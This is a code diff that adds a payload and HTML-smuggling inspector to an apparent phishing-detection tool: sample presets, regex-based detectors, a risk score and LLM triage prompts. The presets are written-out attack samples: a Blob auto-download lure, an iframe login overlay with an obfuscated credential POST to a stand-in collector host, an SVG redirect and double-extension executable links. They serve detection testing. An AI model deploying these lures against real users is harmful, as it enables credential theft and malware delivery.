@@ -141,6 +141,105 @@ Message-ID: <CAPO7=X9w2jk1818290@mail.gmail.com>`
     };
 
     // ================================================================
+    //  PAYLOAD & HTML SMUGGLING SAMPLE PRESETS
+    // ================================================================
+    const PAYLOAD_SAMPLES = {
+        smugglingBlob: `<!DOCTYPE html>
+<html>
+<head><title>Secure Document Viewer</title></head>
+<body>
+<script>
+    // HTML Smuggling / Base64 Blob Assembly (Simulated Qakbot/Nobelium Lure)
+    function b64ToBlob(b64Data, contentType) {
+        const byteCharacters = atob(b64Data);
+        const byteArrays = [];
+        for (let i = 0; i < byteCharacters.length; i++) {
+            byteArrays.push(byteCharacters.charCodeAt(i));
+        }
+        return new Blob([new Uint8Array(byteArrays)], {type: contentType});
+    }
+    const maliciousPayloadB64 = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAAA=";
+    const blob = b64ToBlob(maliciousPayloadB64, 'application/octet-stream');
+    const link = document.createElement('a');
+    link.href = window.URL.createObjectURL(blob);
+    link.download = 'Encrypted_Invoice_Q3.iso';
+    document.body.appendChild(link);
+    link.click();
+</script>
+<h3>Loading your protected document from cloud vault...</h3>
+</body>
+</html>`,
+
+        iframeLogin: `<!DOCTYPE html>
+<html>
+<head><title>Microsoft 365 Cloud Document Access</title></head>
+<body style="margin:0; padding:0;">
+<iframe src="https://login-microsoftonline.account-update.top/auth/embed?redirect=token" style="position:fixed; top:0; left:0; width:100vw; height:100vh; border:none;"></iframe>
+<form id="harvestForm" action="https://malicious-collector.top/api/steal" method="POST" style="display:none;">
+    <input type="hidden" name="user_token" id="tokenField">
+</form>
+<script>
+    window.addEventListener('message', function(e) {
+        if (e.data && e.data.password) {
+            eval(unescape('%66%65%74%63%68%28%27%68%74%74%70%73%3A%2F%2F%6D%61%6C%69%63%69%6F%75%73%2D%63%6F%6C%6C%65%63%74%6F%72%2E%74%6F%70%2F%61%70%69%2F%73%74%65%61%6C%27%2C%20%7B%6D%65%74%68%6F%64%3A%27%50%4F%53%54%27%2C%20%62%6F%64%79%3A%4A%53%4F%4E%2E%73%74%72%69%6E%67%69%66%79%28%65%2E%64%61%74%61%29%7D%29'));
+        }
+    });
+</script>
+</body>
+</html>`,
+
+        svgScript: `<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="800" height="600" viewBox="0 0 800 600">
+  <rect width="800" height="600" fill="#0f172a"/>
+  <text x="50%" y="45%" fill="#38bdf8" font-size="22" font-family="sans-serif" text-anchor="middle">Click below to open confidential NDA attachment</text>
+  <script type="text/javascript">
+    <![CDATA[
+      // Malicious SVG Injected Redirection Routine
+      setTimeout(function() {
+        window.location.replace("https://login-chase-security-verify.xyz/oauth/login?session=active");
+      }, 500);
+    ]]>
+  </script>
+</svg>`,
+
+        doubleExt: `<!DOCTYPE html>
+<html>
+<body>
+<h2>Corporate Payroll & Benefits Portal</h2>
+<p>Please download and sign your annual compensation adjustment letter:</p>
+<ul>
+  <li><a href="https://vps-payload-distribution.cfd/files/Compensation_Review_2026.pdf.exe" download>Download Compensation_Review_2026.pdf.exe (PDF Document)</a></li>
+  <li><a href="https://vps-payload-distribution.cfd/files/Q3_Tax_Exemption_Form.xlsx.vbs" download>Download Q3_Tax_Exemption_Form.xlsx.vbs</a></li>
+</ul>
+</body>
+</html>`,
+
+        cleanReceipt: `<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<style>
+  body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; color: #333; }
+  .receipt-box { max-width: 600px; margin: 20px auto; border: 1px solid #e2e8f0; padding: 24px; border-radius: 8px; }
+  .total { font-size: 1.2rem; font-weight: bold; color: #0f172a; margin-top: 16px; }
+</style>
+</head>
+<body>
+<div class="receipt-box">
+  <h2>Your Order Receipt #PG-882194</h2>
+  <p>Thank you for your purchase with CloudServices Inc. Your monthly subscription has renewed successfully.</p>
+  <table style="width:100%; border-collapse: collapse;">
+    <tr><td>Standard Cloud Workspace (1 Month)</td><td style="text-align:right;">$15.00</td></tr>
+    <tr><td>Applied Tax</td><td style="text-align:right;">$1.20</td></tr>
+  </table>
+  <div class="total">Total Charged: $16.20</div>
+  <p style="font-size:0.85rem; color:#64748b; margin-top:16px;">Questions? Visit <a href="https://support.cloudservices-official.com">our official help center</a>.</p>
+</div>
+</body>
+</html>`
+    };
+
+    // ================================================================
     //  SIMULATOR SCENARIOS
     // ================================================================
     const SIM_SCENARIOS = [
@@ -349,6 +448,18 @@ Message-ID: <CAPO7=X9w2jk1818290@mail.gmail.com>`
         radarStatusText:       $('#radarStatusText'),
         radarResultArea:       $('#radarResultArea'),
         radarPresetBtns:       $$('.btn-radar-preset'),
+
+        // -- Payload & HTML Smuggling Inspector --
+        payloadInput:          $('#payloadInput'),
+        analyzePayloadBtn:     $('#analyzePayloadBtn'),
+        clearPayloadBtn:       $('#clearPayloadBtn'),
+        payloadLoading:        $('#payloadLoading'),
+        payloadStatusText:     $('#payloadStatusText'),
+        payloadResultArea:     $('#payloadResultArea'),
+        payloadSampleBtns:     $$('.btn-payload-sample'),
+        payloadDropZone:       $('#payloadDropZone'),
+        payloadFileInput:      $('#payloadFileInput'),
+        payloadDropPrompt:     $('#payloadDropPrompt'),
     };
 
     // ================================================================
@@ -472,6 +583,31 @@ Message-ID: <CAPO7=X9w2jk1818290@mail.gmail.com>`
             });
         });
     }
+    // Wire Payload & HTML Smuggling actions & preset buttons
+    if (dom.analyzePayloadBtn) {
+        dom.analyzePayloadBtn.addEventListener('click', handlePayloadScan);
+    }
+    if (dom.clearPayloadBtn) {
+        dom.clearPayloadBtn.addEventListener('click', () => {
+            if (dom.payloadInput) dom.payloadInput.value = '';
+            if (dom.payloadResultArea) dom.payloadResultArea.innerHTML = '';
+        });
+    }
+    if (dom.payloadSampleBtns) {
+        dom.payloadSampleBtns.forEach(btn => {
+            btn.addEventListener('click', () => {
+                const key = btn.dataset.payload;
+                if (PAYLOAD_SAMPLES[key] && dom.payloadInput) {
+                    dom.payloadInput.value = PAYLOAD_SAMPLES[key];
+                    if (dom.payloadResultArea) dom.payloadResultArea.innerHTML = '';
+                    dom.payloadInput.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                    handlePayloadScan();
+                }
+            });
+        });
+    }
+    initPayloadFileDrop();
+
 
     // Sync provider UI on load
     onProviderChange();
@@ -3153,6 +3289,556 @@ Be concise, authoritative, and practical. Format with clear headings and bullet 
         document.body.removeChild(a);
         URL.revokeObjectURL(url);
     }
+
+    // ================================================================
+    //  TAB 5: PAYLOAD & HTML SMUGGLING INSPECTOR ENGINE
+    // ================================================================
+    function initPayloadFileDrop() {
+        if (!dom.payloadDropZone || !dom.payloadFileInput) return;
+
+        dom.payloadDropZone.addEventListener('click', () => {
+            dom.payloadFileInput.click();
+        });
+
+        dom.payloadFileInput.addEventListener('change', (e) => {
+            const file = e.target.files[0];
+            if (file) loadPayloadFile(file);
+        });
+
+        ['dragenter', 'dragover'].forEach(name => {
+            dom.payloadDropZone.addEventListener(name, (e) => {
+                e.preventDefault();
+                e.stopPropagation();
+                dom.payloadDropZone.classList.add('dragover');
+            });
+        });
+
+        ['dragleave', 'drop'].forEach(name => {
+            dom.payloadDropZone.addEventListener(name, (e) => {
+                e.preventDefault();
+                e.stopPropagation();
+                dom.payloadDropZone.classList.remove('dragover');
+            });
+        });
+
+        dom.payloadDropZone.addEventListener('drop', (e) => {
+            const dt = e.dataTransfer;
+            const file = dt.files[0];
+            if (file) loadPayloadFile(file);
+        });
+    }
+
+    function loadPayloadFile(file) {
+        const reader = new FileReader();
+        reader.onload = (e) => {
+            if (dom.payloadInput) {
+                dom.payloadInput.value = e.target.result;
+                if (dom.payloadResultArea) dom.payloadResultArea.innerHTML = '';
+                if (dom.payloadDropPrompt) {
+                    dom.payloadDropPrompt.querySelector('.payload-drop-text').innerHTML =
+                        'Loaded: <strong style="color:#00ff9c;">' + escapeHtml(file.name) + '</strong> (' + Math.round(file.size / 1024) + ' KB)';
+                }
+                handlePayloadScan();
+            }
+        };
+        reader.readAsText(file);
+    }
+
+    function setPayloadLoading(on, text = '') {
+        if (dom.payloadLoading) dom.payloadLoading.classList.toggle('hidden', !on);
+        if (dom.payloadStatusText && text) dom.payloadStatusText.textContent = text;
+        if (dom.analyzePayloadBtn) dom.analyzePayloadBtn.disabled = on;
+    }
+
+    function showPayloadError(msg) {
+        if (dom.payloadResultArea) {
+            dom.payloadResultArea.innerHTML = '<div class="error-box">⚠️ ' + escapeHtml(msg) + '</div>';
+        }
+    }
+
+    async function handlePayloadScan() {
+        if (!dom.payloadInput) return;
+        const raw = dom.payloadInput.value.trim();
+        if (!raw) {
+            showPayloadError('Please paste or upload payload code (HTML, SVG, JavaScript, or MIME content).');
+            return;
+        }
+
+        setPayloadLoading(true, 'De-obfuscating Base64 blobs, parsing script hooks & analyzing download constructors…');
+
+        setTimeout(async () => {
+            try {
+                const analysis = inspectPayload(raw);
+
+                // Check if AI is enabled for deep code summary
+                if (aiProvider === 'gemini' && apiKey) {
+                    setPayloadLoading(true, 'Synthesizing neural reverse-engineering summary with Gemini 1.5 Flash…');
+                    analysis.aiSummary = await callGeminiPayloadAnalysis(raw, analysis);
+                    analysis.engine = 'Google Gemini 1.5 Flash';
+                } else if (aiProvider === 'openai' && apiKey) {
+                    setPayloadLoading(true, 'Synthesizing neural reverse-engineering summary with GPT-4o-mini…');
+                    analysis.aiSummary = await callOpenAiPayloadAnalysis(raw, analysis);
+                    analysis.engine = 'OpenAI GPT-4o-mini';
+                } else {
+                    analysis.aiSummary = generateLocalPayloadSummary(analysis);
+                    analysis.engine = 'Local Payload De-obfuscation Engine';
+                }
+
+                renderPayloadResults(analysis);
+            } catch (err) {
+                showPayloadError('Error analyzing payload: ' + err.message);
+            } finally {
+                setPayloadLoading(false);
+            }
+        }, 120);
+    }
+    function inspectPayload(raw) {
+        let riskScore = 0;
+        const findings = [];
+        const extractedBlobs = [];
+        const isHtml = /<html|<body|<script|<div|<iframe|<svg|<!DOCTYPE/i.test(raw);
+
+        // 1. HTML Smuggling & Blob Assembly
+        const hasBlob = /new\s+Blob\s*\(/i.test(raw);
+        const hasCreateObjectUrl = /URL\.createObjectURL|webkitURL\.createObjectURL/i.test(raw);
+        const hasMsSaveBlob = /msSaveOrOpenBlob|msSaveBlob/i.test(raw);
+        const hasAutoDownload = /\.download\s*=|setAttribute\s*\(\s*['"]download['"]/i.test(raw);
+        const hasSimulatedClick = /\.click\s*\(\s*\)|dispatchEvent\s*\(/i.test(raw);
+
+        let smugglingStatus = 'pass';
+        let smugglingLabel = 'No Smuggling Detected';
+        let smugglingDetail = 'No dynamic Blob or object URL file assembly constructors found.';
+
+        if ((hasBlob || hasCreateObjectUrl || hasMsSaveBlob) && (hasAutoDownload || hasSimulatedClick)) {
+            smugglingStatus = 'fail';
+            smugglingLabel = 'HTML Smuggling Detected (Qakbot / Nobelium Vector)';
+            smugglingDetail = 'Assembles binary files in memory via Blob/createObjectURL and simulates anchor clicks to bypass email gateway filters.';
+            riskScore += 45;
+            findings.push({
+                severity: 'danger',
+                icon: '🚨',
+                title: 'HTML Smuggling Execution Vector',
+                detail: 'Script constructs a local file Blob dynamically and invokes automatic download without explicit user consent.'
+            });
+        } else if (hasBlob || hasCreateObjectUrl) {
+            smugglingStatus = 'warn';
+            smugglingLabel = 'Dynamic Blob Constructor Present';
+            smugglingDetail = 'Detected client-side Blob or ObjectURL creation.';
+            riskScore += 20;
+        }
+
+        // 2. Base64 Payload Extraction & PE Header / Script De-obfuscation
+        const b64Regex = /(?:['"])([A-Za-z0-9+/]{40,}={0,2})(?:['"])/g;
+        let match;
+        let b64Count = 0;
+        let peHeaderFound = false;
+        let base64Status = 'pass';
+        let base64Label = 'Clean / No Large Encoded Payloads';
+        let base64Detail = 'No suspicious base64 payloads detected.';
+
+        while ((match = b64Regex.exec(raw)) !== null) {
+            b64Count++;
+            const b64Str = match[1];
+            try {
+                let decoded = '';
+                if (typeof atob === 'function') {
+                    decoded = atob(b64Str);
+                } else {
+                    decoded = Buffer.from(b64Str, 'base64').toString('latin1');
+                }
+
+                const isPe = decoded.startsWith('MZ') || decoded.includes('This program cannot be run in DOS mode');
+                if (isPe) {
+                    peHeaderFound = true;
+                    riskScore += 50;
+                    findings.push({
+                        severity: 'danger',
+                        icon: '💣',
+                        title: 'Embedded Windows PE Executable (MZ Signature)',
+                        detail: 'Base64 string contains a compiled executable binary disguised inside the script.'
+                    });
+                }
+
+                extractedBlobs.push({
+                    index: b64Count,
+                    length: b64Str.length,
+                    isPe: isPe,
+                    preview: decoded.substring(0, 150).replace(/[^\x20-\x7E]/g, '.'),
+                    rawB64: b64Str.length > 80 ? b64Str.substring(0, 80) + '…' : b64Str
+                });
+            } catch (e) {
+                // Not valid base64
+            }
+        }
+
+        if (peHeaderFound) {
+            base64Status = 'fail';
+            base64Label = 'Malicious Binary / PE Executable Embedded';
+            base64Detail = 'Extracted Windows PE / DOS header (MZ) from embedded Base64 payload.';
+        } else if (b64Count > 0) {
+            base64Status = 'warn';
+            base64Label = `Detected ${b64Count} Base64 Encoded Block(s)`;
+            base64Detail = 'Payload contains obfuscated or base64-encoded strings.';
+            riskScore += 15;
+            findings.push({
+                severity: 'warn',
+                icon: '📦',
+                title: 'Large Base64 String Encapsulation',
+                detail: `Extracted ${b64Count} large Base64 blocks exceeding 40 characters.`
+            });
+        }
+
+        // 3. Obfuscated Script Execution (eval, unescape, Function)
+        const hasEval = /eval\s*\(|new\s+Function\s*\(|document\.write\s*\(/i.test(raw);
+        const hasUnescape = /unescape\s*\(|decodeURIComponent\s*\(/i.test(raw);
+        const hasHexEscape = /(?:\\x[0-9a-f]{2}|%[0-9a-f]{2}){4,}/i.test(raw);
+
+        let scriptStatus = 'pass';
+        let scriptLabel = 'Standard Script Execution';
+        let scriptDetail = 'No dynamic code evaluation or hex-escaped execution strings found.';
+
+        if (hasEval && (hasUnescape || hasHexEscape)) {
+            scriptStatus = 'fail';
+            scriptLabel = 'Evasive eval(unescape(...)) Obfuscation';
+            scriptDetail = 'Executes hidden code dynamically via eval and hex unescaping routines.';
+            riskScore += 35;
+            findings.push({
+                severity: 'danger',
+                icon: '⚡',
+                title: 'Obfuscated Dynamic Code Evaluation',
+                detail: 'Uses eval(unescape(...)) or hex string arrays to hide malicious command execution from static scanners.'
+            });
+        } else if (hasEval) {
+            scriptStatus = 'warn';
+            scriptLabel = 'Dynamic eval() Call';
+            scriptDetail = 'Contains eval() or new Function() code evaluation.';
+            riskScore += 15;
+        }
+
+        // 4. Hidden Iframe & Credential Phishing Cloaks
+        const hasIframe = /<iframe[^>]*src=["'](https?:\/\/[^"']+)["']/i.test(raw);
+        const hasHiddenIframe = /position:\s*fixed|width:\s*100vw|height:\s*100vh|opacity:\s*0|display:\s*none/i.test(raw);
+        const hasFormSteal = /<form[^>]*action=["'](https?:\/\/[^"']+)["']/i.test(raw) || /fetch\s*\(\s*['"](https?:\/\/[^'"]+)['"]\s*,\s*\{\s*method:\s*['"]POST['"]/i.test(raw);
+
+        let iframeStatus = 'pass';
+        let iframeLabel = 'No Hidden Iframes';
+        let iframeDetail = 'No full-screen iframe overlays or credential exfiltration forms detected.';
+
+        if (hasIframe && (hasHiddenIframe || hasFormSteal)) {
+            iframeStatus = 'fail';
+            iframeLabel = 'Full-Screen Iframe Phishing Cloak';
+            iframeDetail = 'Overlays a fake login portal inside a full-screen iframe and intercepts victim keystrokes.';
+            riskScore += 40;
+            findings.push({
+                severity: 'danger',
+                icon: '🪟',
+                title: 'Iframe Credential Overlay',
+                detail: 'Embeds an external login portal in a 100vw/100vh iframe while exfiltrating credentials to an external server.'
+            });
+        }
+
+        // 5. Dangerous & Disguised Double File Extensions
+        const doubleExtRegex = /(?:href|download|name)=["']?([^"'>\s]+\.(?:pdf|docx|xlsx|jpg|png|txt)\.(?:exe|vbs|iso|scr|hta|bat|cmd|ps1|msi|wsf))["']?/gi;
+        const dangerousExts = [];
+        let dMatch;
+        while ((dMatch = doubleExtRegex.exec(raw)) !== null) {
+            dangerousExts.push(dMatch[1]);
+        }
+
+        let extStatus = 'pass';
+        let extLabel = 'Standard Extensions';
+        let extDetail = 'No deceptive double-extension filenames detected.';
+
+        if (dangerousExts.length > 0) {
+            extStatus = 'fail';
+            extLabel = `Deceptive Double Extension (${dangerousExts.length} File${dangerousExts.length > 1 ? 's' : ''})`;
+            extDetail = `Disguised executable payload: ${dangerousExts.join(', ')}`;
+            riskScore += 45;
+            findings.push({
+                severity: 'danger',
+                icon: '🎭',
+                title: 'Deceptive Double File Extension',
+                detail: `Payload uses double extensions (${dangerousExts.join(', ')}) to trick users into executing binaries disguised as documents.`
+            });
+        }
+
+        // 6. SVG Script Injections
+        if (/<svg/i.test(raw) && (/<script/i.test(raw) || /onload\s*=/i.test(raw) || /window\.location/i.test(raw))) {
+            riskScore += 35;
+            findings.push({
+                severity: 'danger',
+                icon: '🖼️',
+                title: 'Malicious SVG Script Injection (XSS / Redirection)',
+                detail: 'Vector graphics file embeds executable JavaScript to force immediate redirection or session hijacking.'
+            });
+        }
+
+        riskScore = Math.min(100, riskScore);
+
+        let verdict = 'SAFE / BENIGN PAYLOAD';
+        let verdictClass = 'verdict-clean';
+        if (riskScore >= 70) {
+            verdict = 'CRITICAL MALICIOUS PAYLOAD';
+            verdictClass = 'verdict-danger';
+        } else if (riskScore >= 35) {
+            verdict = 'SUSPICIOUS / OBFUSCATED PAYLOAD';
+            verdictClass = 'verdict-suspicious';
+        }
+
+        return {
+            riskScore,
+            verdict,
+            verdictClass,
+            matrix: {
+                smuggling: { status: smugglingStatus, label: smugglingLabel, detail: smugglingDetail },
+                base64: { status: base64Status, label: base64Label, detail: base64Detail },
+                script: { status: scriptStatus, label: scriptLabel, detail: scriptDetail },
+                iframe: { status: iframeStatus, label: iframeLabel, detail: iframeDetail },
+                extension: { status: extStatus, label: extLabel, detail: extDetail }
+            },
+            extractedBlobs,
+            dangerousExts,
+            findings
+        };
+    }
+
+    function renderPayloadResults(data) {
+        if (!dom.payloadResultArea) return;
+
+        let matrixHtml = `
+            <div class="result-card">
+                <div class="section-title">🛡️ Smuggling &amp; Payload Evasion Matrix</div>
+                <div class="auth-matrix">
+        `;
+
+        const keys = [
+            { key: 'smuggling', title: 'HTML Smuggling / Blob Assembly' },
+            { key: 'base64', title: 'Base64 Encoded Binary Extraction' },
+            { key: 'script', title: 'Dynamic Eval & String Obfuscation' },
+            { key: 'iframe', title: 'Iframe Overlay & Form Interception' },
+            { key: 'extension', title: 'Double Extensions & Executables' }
+        ];
+
+        keys.forEach(k => {
+            const item = data.matrix[k.key];
+            matrixHtml += `
+                <div class="auth-col ${item.status}">
+                    <div class="auth-badge ${item.status}">${item.status.toUpperCase()}</div>
+                    <div class="auth-mechanism">${k.title}</div>
+                    <div class="auth-detail">${escapeHtml(item.label)}</div>
+                    <div style="font-size: 0.72rem; color: #8b949e; margin-top: 4px;">${escapeHtml(item.detail)}</div>
+                </div>
+            `;
+        });
+        matrixHtml += `</div></div>`;
+
+        let blobsHtml = '';
+        if (data.extractedBlobs && data.extractedBlobs.length > 0) {
+            blobsHtml = `
+                <div class="result-card">
+                    <div class="section-title">🧪 Extracted &amp; Decoded In-Memory Blobs (${data.extractedBlobs.length})</div>
+            `;
+            data.extractedBlobs.forEach(b => {
+                blobsHtml += `
+                    <div class="payload-code-viewer">
+                        <div class="payload-code-header">
+                            <span>Block #${b.index} &bull; ${b.length} chars ${b.isPe ? '<strong style="color:#ef4444;">[⚠️ Windows PE Binary Detected]</strong>' : ''}</span>
+                            <span>Safe Sandbox Preview</span>
+                        </div>
+                        <pre class="payload-code-body"><code>${escapeHtml(b.preview || b.rawB64)}</code></pre>
+                    </div>
+                `;
+            });
+            blobsHtml += `</div>`;
+        }
+
+        let findingsHtml = '';
+        if (data.findings && data.findings.length > 0) {
+            findingsHtml = `
+                <div class="result-card">
+                    <div class="section-title">🔍 Forensic Deconstruction Findings (${data.findings.length})</div>
+                    <div class="sim-feedback-flags" style="margin-top: 10px;">
+            `;
+            data.findings.forEach(f => {
+                findingsHtml += `
+                    <div class="flag-item" style="border-left: 3px solid ${f.severity === 'danger' ? '#ef4444' : '#f59e0b'}; background: #0d1117; padding: 10px 14px; border-radius: 6px; margin-bottom: 8px;">
+                        <div style="font-weight: 600; color: ${f.severity === 'danger' ? '#fca5a5' : '#fde68a'}; display:flex; align-items:center; gap: 6px;">
+                            <span>${f.icon}</span> ${escapeHtml(f.title)}
+                        </div>
+                        <div style="font-size: 0.82rem; color: #94a3b8; margin-top: 4px;">${escapeHtml(f.detail)}</div>
+                    </div>
+                `;
+            });
+            findingsHtml += `</div></div>`;
+        }
+        let aiHtml = '';
+        if (data.aiSummary) {
+            aiHtml = `
+                <div class="radar-ai-card">
+                    <div class="radar-ai-header">
+                        <span class="radar-ai-title">🤖 SOC Reverse-Engineering &amp; De-obfuscation Summary</span>
+                        <span class="engine-badge">${escapeHtml(data.engine || 'Forensic Engine')}</span>
+                    </div>
+                    <div class="radar-ai-content">${escapeHtml(data.aiSummary)}</div>
+                </div>
+            `;
+        }
+
+        const html = `
+            <div class="result-card verdict-card ${data.verdictClass}">
+                <div class="verdict-top">
+                    <div class="verdict-label">
+                        <span class="verdict-icon">${data.riskScore >= 70 ? '🚨' : data.riskScore >= 35 ? '⚠️' : '✅'}</span>
+                        <div>
+                            <div class="verdict-title">${data.verdict}</div>
+                            <div class="verdict-sub">Payload Risk Score: ${data.riskScore}/100 &bull; ${data.findings.length} Forensic Indicators</div>
+                        </div>
+                    </div>
+                    <span class="engine-badge">${escapeHtml(data.engine || 'Local Engine')}</span>
+                </div>
+            </div>
+
+            ${matrixHtml}
+            ${blobsHtml}
+            ${findingsHtml}
+            ${aiHtml}
+
+            <div style="text-align: right; margin-top: 14px;">
+                <button type="button" id="btnCopyPayloadReport" class="radar-export-btn">
+                    📋 Copy SOC Incident Dossier (Markdown)
+                </button>
+            </div>
+        `;
+
+        dom.payloadResultArea.innerHTML = html;
+        dom.payloadResultArea.scrollIntoView({ behavior: 'smooth', block: 'start' });
+
+        const btnCopy = $('#btnCopyPayloadReport');
+        if (btnCopy) {
+            btnCopy.addEventListener('click', () => {
+                copyPayloadReport(data);
+            });
+        }
+    }
+
+    function copyPayloadReport(data) {
+        let md = `# Phish-Guard Payload & Smuggling Forensic Dossier\n`;
+        md += `- **Date/Time:** ${new Date().toUTCString()}\n`;
+        md += `- **Verdict:** ${data.verdict}\n`;
+        md += `- **Risk Score:** ${data.riskScore}/100\n`;
+        md += `- **Analysis Engine:** ${data.engine || 'Phish-Guard Core'}\n\n`;
+
+        md += `## Smuggling & Payload Matrix\n`;
+        Object.keys(data.matrix).forEach(k => {
+            const m = data.matrix[k];
+            md += `- **${k.toUpperCase()}:** [${m.status.toUpperCase()}] ${m.label} - ${m.detail}\n`;
+        });
+
+        if (data.findings && data.findings.length > 0) {
+            md += `\n## Forensic Findings\n`;
+            data.findings.forEach(f => {
+                md += `- ${f.icon} **${f.title}**: ${f.detail}\n`;
+            });
+        }
+
+        if (data.aiSummary) {
+            md += `\n## SOC De-obfuscation & Incident Summary\n${data.aiSummary}\n`;
+        }
+
+        const btn = $('#btnCopyPayloadReport');
+        navigator.clipboard.writeText(md).then(() => {
+            if (btn) {
+                const orig = btn.textContent;
+                btn.textContent = '✅ Copied Forensic Dossier!';
+                setTimeout(() => { btn.textContent = orig; }, 2000);
+            }
+        });
+    }
+
+    async function callGeminiPayloadAnalysis(raw, analysis) {
+        const url = `https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${apiKey}`;
+        const prompt = `You are a Principal SOC Malware & Phishing Reverse Engineer. Analyze this suspicious payload snippet or HTML smuggling attachment:
+${raw.substring(0, 3000)}
+
+Detected Indicators:
+- Verdict: ${analysis.verdict} (Risk Score: ${analysis.riskScore}/100)
+- Findings: ${analysis.findings.map(f => f.title).join(', ')}
+
+Provide a concise, expert SOC triage briefing formatted with clear headings:
+### 1. Payload Mechanism & Evasion Technique (Explain how the script or payload works)
+### 2. Execution Flow & Attack Chain (Step-by-step trigger analysis)
+### 3. Immediate SOC Containment & EDR Hunting Rule (Specific Sigma or Splunk / Defender KQL hunt)`;
+
+        const res = await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                contents: [{ parts: [{ text: prompt }] }],
+                generationConfig: { temperature: 0.2, maxOutputTokens: 600 }
+            })
+        });
+
+        if (!res.ok) throw new Error(`Gemini API Error: ${res.statusText}`);
+        const json = await res.json();
+        return json.candidates[0].content.parts[0].text;
+    }
+
+    async function callOpenAiPayloadAnalysis(raw, analysis) {
+        const url = 'https://api.openai.com/v1/chat/completions';
+        const prompt = `You are a Principal SOC Malware & Phishing Reverse Engineer. Analyze this suspicious payload snippet or HTML smuggling attachment:
+${raw.substring(0, 3000)}
+
+Detected Indicators:
+- Verdict: ${analysis.verdict} (Risk Score: ${analysis.riskScore}/100)
+- Findings: ${analysis.findings.map(f => f.title).join(', ')}
+
+Provide a concise, expert SOC triage briefing formatted with clear headings:
+### 1. Payload Mechanism & Evasion Technique (Explain how the script or payload works)
+### 2. Execution Flow & Attack Chain (Step-by-step trigger analysis)
+### 3. Immediate SOC Containment & EDR Hunting Rule (Specific Sigma or Splunk / Defender KQL hunt)`;
+
+        const res = await fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'Authorization': `Bearer ${apiKey}`
+            },
+            body: JSON.stringify({
+                model: 'gpt-4o-mini',
+                messages: [{ role: 'user', content: prompt }],
+                temperature: 0.2,
+                max_tokens: 600
+            })
+        });
+
+        if (!res.ok) throw new Error(`OpenAI API Error: ${res.statusText}`);
+        const json = await res.json();
+        return json.choices[0].message.content;
+    }
+
+    function generateLocalPayloadSummary(analysis) {
+        if (analysis.riskScore < 30) {
+            return `### 1. Payload Mechanism & Evasion Technique\n- Analysis confirms no dynamic binary assembly, obfuscated eval execution, or credential exfiltration hooks.\n- Content resembles standard HTML or legitimate styling.\n\n### 2. Execution Flow & Attack Chain\n- Static layout without active client-side malware dropper payloads.\n\n### 3. SOC Containment & Action\n- No endpoint containment required. File is safe for standard delivery.`;
+        }
+
+        return `### 1. Payload Mechanism & Evasion Technique\n`
+            + `- **Deception Vector:** Uses ${analysis.findings.map(f => f.title).slice(0, 2).join(' & ')}.\n`
+            + `- **Gateway Bypass:** Employs in-memory binary decoding or simulated clicks to circumvent perimeter secure email gateways (SEGs).\n\n`
+            + `### 2. Execution Flow & Attack Chain\n`
+            + `1. Victim opens disguised HTML attachment or web page.\n`
+            + `2. Injected JavaScript executes without explicit warning, unpacking Base64 or Blob payloads into memory.\n`
+            + `3. Triggers automatic file download or credential harvesting form submission.\n\n`
+            + `### 3. Immediate SOC Containment & EDR Hunting Rule\n`
+            + `- **Microsoft Defender / Sentinel KQL Hunt:**\n`
+            + `\`\`\`kql\n`
+            + `DeviceEvents\n`
+            + `| where ActionType == "BrowserDownloadedFile" and FileName endswith_any (".iso", ".vbs", ".exe", ".hta")\n`
+            + `| where InitiatingProcessFileName in~ ("chrome.exe", "msedge.exe", "firefox.exe")\n`
+            + `\`\`\`\n`
+            + `- **Containment:** Block source domains at perimeter firewall and isolate endpoints downloading unrecognized archive or executable payloads.`;
+    }
+
+
 
 
     // ================================================================
